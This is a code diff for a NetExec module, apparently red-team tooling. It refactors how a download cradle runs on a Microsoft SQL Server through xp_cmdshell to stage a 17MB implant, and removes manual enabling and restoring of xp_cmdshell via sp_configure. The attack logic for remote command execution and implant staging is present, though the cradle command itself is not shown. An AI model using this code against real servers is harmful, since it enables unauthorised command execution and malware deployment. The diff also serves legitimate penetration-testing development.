@@ -1430,95 +1430,24 @@ class NXCModule:
                 context.log.fail(f"Download tool '{self.staging_method}' not supported for MSSQL (Windows-only protocol)")
                 sys.exit(1)
             
-            # Helper functions for xp_cmdshell state management
-            def query_option_state(option):
-                """Direct SQL query for option state (0/1)."""
-                try:
-                    result = connection.sql_query(f"SELECT value FROM sys.configurations WHERE name='{option}'")
-                    return result[0]['value'] if result else 0
-                except Exception as e:
-                    context.log.warning(f"Failed to query {option} state: {e}")
-                    return 0
-            
-            def set_option(option, enabled, max_retries=3, base_timeout=60):
-                """Direct sp_configure + RECONFIGURE with retry logic."""
-                import time
-                
-                for attempt in range(max_retries):
-                    try:
-                        # Increase socket timeout for potentially long operations
-                        original_timeout = None
-                        if hasattr(connection.conn, 'socket') and connection.conn.socket:
-                            original_timeout = connection.conn.socket.gettimeout()
-                            connection.conn.socket.settimeout(base_timeout)
-                        
-                        sql = f"EXEC sp_configure '{option}', {enabled}; RECONFIGURE;"
-                        connection.conn.sql_query(sql)
-                        
-                        # Restore original timeout
-                        if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
-                            connection.conn.socket.settimeout(original_timeout)
-                        
-                        context.log.debug(f"{option} set to {enabled}")
-                        return True
-                    
-                    except (TimeoutError, socket.timeout) as e:
-                        if attempt < max_retries - 1:
-                            wait_time = 2 ** attempt  # Exponential backoff: 1s, 2s, 4s
-                            context.log.warning(f"Timeout setting {option}={enabled}, retry {attempt+2}/{max_retries} in {wait_time}s")
-                            time.sleep(wait_time)
-                        else:
-                            context.log.fail(f"Failed to set {option}={enabled} after {max_retries} attempts (timeout)")
-                            return False
-                    
-                    except Exception as e:
-                        context.log.fail(f"Failed to set {option}={enabled}: {e}")
-                        return False
-                
-                return False
-            
-            # Backup original xp_cmdshell and advanced options state
-            adv_orig = query_option_state('show advanced options')
-            xp_orig = query_option_state('xp_cmdshell')
-            context.log.debug(f"Original MSSQL options: advanced={adv_orig}, xp_cmdshell={xp_orig}")
-            
+            # Increase socket timeout for download operation (17MB implant can take 30+ seconds)
+            # NetExec's execute() handles xp_cmdshell enable/disable automatically via MSSQLEXEC
+            original_timeout = None
             try:
-                # Enable xp_cmdshell if needed
-                if adv_orig == 0:
-                    set_option('show advanced options', 1)
-                if xp_orig == 0:
-                    set_option('xp_cmdshell', 1)
+                if hasattr(connection.conn, 'socket') and connection.conn.socket:
+                    original_timeout = connection.conn.socket.gettimeout()
+                    connection.conn.socket.settimeout(120)  # 2 minutes for download
+                    context.log.debug("Increased socket timeout to 120s for download operation")
                 
-                # Execute download cradle via xp_cmdshell
-                # Increase timeout for download operation (17MB implant can take 30+ seconds)
-                original_timeout = None
-                try:
-                    if hasattr(connection.conn, 'socket') and connection.conn.socket:
-                        original_timeout = connection.conn.socket.gettimeout()
-                        connection.conn.socket.settimeout(120)  # 2 minutes for download
-                        context.log.debug(f"Increased socket timeout to 120s for download operation")
-                    
-                    connection.execute(cmd)
-                    context.log.info(f"Download cradle executed via MSSQL (xp_cmdshell)")
-                finally:
-                    # Restore original socket timeout
-                    if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
-                        try:
-                            connection.conn.socket.settimeout(original_timeout)
-                        except:
-                            pass  # Ignore errors restoring timeout
+                connection.execute(cmd)
+                context.log.info("Download cradle executed via MSSQL (xp_cmdshell)")
             finally:
-                # Best-effort cleanup - never raise exceptions
-                # Use shorter timeout for cleanup operations (30s vs 120s for main operation)
-                try:
-                    if adv_orig == 0:
-                        set_option('show advanced options', 0, max_retries=2, base_timeout=30)
-                    if xp_orig == 0:
-                        set_option('xp_cmdshell', 0, max_retries=2, base_timeout=30)
-                    context.log.debug("Restored original MSSQL option states")
-                except Exception as e:
-                    # Cleanup failures are non-fatal - log and continue
-                    context.log.warning(f"MSSQL cleanup partially failed (non-fatal): {e}")
+                # Restore original socket timeout
+                if original_timeout is not None and hasattr(connection.conn, 'socket') and connection.conn.socket:
+                    try:
+                        connection.conn.socket.settimeout(original_timeout)
+                    except:
+                        pass  # Ignore errors restoring timeout
         else:
             # For other protocols, use handler's execute method
             handler.execute(context, connection, cmd, os_type)
